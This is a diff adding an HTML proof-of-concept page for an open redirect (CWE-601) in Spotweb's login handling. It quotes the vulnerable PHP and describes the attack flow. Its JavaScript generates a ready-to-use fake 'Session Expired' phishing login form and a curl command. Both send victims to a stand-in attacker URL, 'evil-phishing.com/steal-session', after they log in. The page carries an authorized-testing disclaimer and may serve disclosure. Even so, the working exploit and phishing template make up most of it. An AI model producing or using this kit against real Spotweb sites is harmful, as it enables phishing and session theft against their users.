@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spotweb Open Redirect PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid #0f3460;
+        }
+        h1 { color: #e94560; }
+        h2 { color: #00ff88; }
+        .warning {
+            background: #e94560;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 4px;
+            background: #0f3460;
+            color: #fff;
+            font-size: 14px;
+        }
+        button {
+            background: #e94560;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover { background: #ff6b6b; }
+        pre {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            color: #00ff88;
+        }
+        code {
+            background: #0f3460;
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+        .test-section {
+            background: #0f3460;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Open Redirect PoC</h1>
+        <p><strong>Spotweb - All Versions</strong></p>
+
+        <div class="warning">
+            <strong>DISCLAIMER:</strong> This PoC is for authorized security testing only.
+            Only test against systems you have explicit permission to test.
+        </div>
+
+        <h2>Vulnerability Details</h2>
+        <ul>
+            <li><strong>Files:</strong> <code>templates/*/login.inc.php</code>, <code>lib/SpotTemplateHelper.php</code></li>
+            <li><strong>Parameter:</strong> <code>loginform[http_referer]</code> (POST)</li>
+            <li><strong>Type:</strong> CWE-601 Open Redirect</li>
+            <li><strong>Trigger:</strong> After successful authentication</li>
+        </ul>
+
+        <div class="test-section">
+            <h2>Interactive PoC Generator</h2>
+
+            <label>Target Spotweb URL:</label>
+            <input type="text" id="target" placeholder="https://spotweb.example.com" value="https://TARGET-SPOTWEB.com">
+
+            <label>Malicious Redirect URL:</label>
+            <input type="text" id="redirect" placeholder="https://evil-site.com" value="https://evil-phishing.com/steal-session">
+
+            <br><br>
+            <button onclick="generateForm()">Generate HTML Exploit</button>
+            <button onclick="generateCurl()">Generate cURL Command</button>
+        </div>
+
+        <h2>Generated Exploit</h2>
+        <pre id="output">Click a button above to generate exploit code...</pre>
+
+        <h2>Vulnerable Code</h2>
+        <pre>
+// templates/we1rdo/login.inc.php - Lines 7-8
+if (isset($data['performredirect']) && ($result->isSuccess())) {
+    $tplHelper->redirect($loginform['http_referer']);  // USER CONTROLLED!
+}
+
+// Hidden form field - Line 41
+&lt;input type="hidden" name="loginform[http_referer]" value="..."&gt;
+
+// lib/SpotTemplateHelper.php - Line 1586-1589
+public function redirect($url)
+{
+    header('Location: '.$url);  // NO VALIDATION!
+}
+        </pre>
+
+        <h2>Attack Flow</h2>
+        <ol>
+            <li>Attacker creates phishing page with malicious login form</li>
+            <li>Form submits to real Spotweb with <code>loginform[http_referer]=evil.com</code></li>
+            <li>Victim enters valid credentials</li>
+            <li>After successful login, victim is redirected to attacker's site</li>
+            <li>Attacker harvests session or performs further attacks</li>
+        </ol>
+    </div>
+
+    <script>
+    function generateForm() {
+        const target = document.getElementById('target').value;
+        const redirect = document.getElementById('redirect').value;
+
+        const html = `&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Spotweb - Session Expired&lt;/h1&gt;
+&lt;p&gt;Please login again to continue.&lt;/p&gt;
+
+&lt;form action="${target}/?page=login" method="POST" id="exploit"&gt;
+    &lt;input type="text" name="loginform[username]" placeholder="Username"&gt;&lt;br&gt;
+    &lt;input type="password" name="loginform[password]" placeholder="Password"&gt;&lt;br&gt;
+
+    &lt;!-- Malicious redirect --&gt;
+    &lt;input type="hidden" name="loginform[http_referer]" value="${redirect}" /&gt;
+    &lt;input type="hidden" name="data[performredirect]" value="1" /&gt;
+
+    &lt;button type="submit"&gt;Login&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;`;
+
+        document.getElementById('output').textContent = html;
+    }
+
+    function generateCurl() {
+        const target = document.getElementById('target').value;
+        const redirect = document.getElementById('redirect').value;
+
+        const curl = `# Spotweb Open Redirect PoC
+# Replace USERNAME and PASSWORD with valid credentials
+
+curl -X POST "${target}/?page=login" \\
+  -d "loginform[username]=USERNAME" \\
+  -d "loginform[password]=PASSWORD" \\
+  -d "loginform[http_referer]=${encodeURIComponent(redirect)}" \\
+  -d "data[performredirect]=1" \\
+  -v 2>&1 | grep -i "location"
+
+# Expected output on successful login:
+# < Location: ${redirect}`;
+
+        document.getElementById('output').textContent = curl;
+    }
+    </script>
+</body>
+</html>
